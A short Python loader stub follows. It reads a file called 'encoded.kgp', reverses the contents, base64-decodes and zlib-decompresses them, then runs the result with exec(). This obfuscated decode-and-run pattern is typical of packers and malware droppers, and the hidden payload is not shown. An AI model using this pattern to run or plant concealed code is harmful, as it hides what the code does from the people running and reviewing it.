_ = lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1])); 

with open('encoded.kgp', 'r') as file:
    encoded_code = file.read()
exec((_) (encoded_code))